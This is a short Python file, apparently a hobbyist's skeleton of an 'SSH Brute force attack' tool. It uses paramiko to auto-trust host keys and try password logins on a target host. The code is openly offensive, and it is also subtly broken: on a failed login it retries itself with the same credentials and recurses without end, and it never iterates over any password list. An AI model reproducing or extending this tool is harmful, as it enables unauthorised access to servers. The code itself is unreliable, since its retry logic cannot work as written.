"""
SSH Brute force attack
Creator: ju_dev
"""
from paramiko import SSHClient, AutoAddPolicy
from paramiko.ssh_exception import AuthenticationException

class Authentication:
    def __init__(self, client: SSHClient, known_hosts_path: str):
        self.client = client

        self.client.load_host_keys(known_hosts_path)
        self.client.load_system_host_keys()

        self.client.set_missing_host_key_policy(AutoAddPolicy())

    def ssh_login(self, hostname: str, username: str, password: str):
        try:
            self.client.connect(hostname=hostname, username=username, password=password)
        except AuthenticationException:
            self.ssh_login(hostname, username, password)  
            print("Authentication failed.")
    
    def debug_info(self, stdin, stdout, stderr):
        print(f"STDOUT: {stdout.read().decode('utf8')}")
        print(f"STDERR: {stderr.read().decode('utf8')}")
        
        print(f"Return code: {stdout.channel.recv_exit_status()}")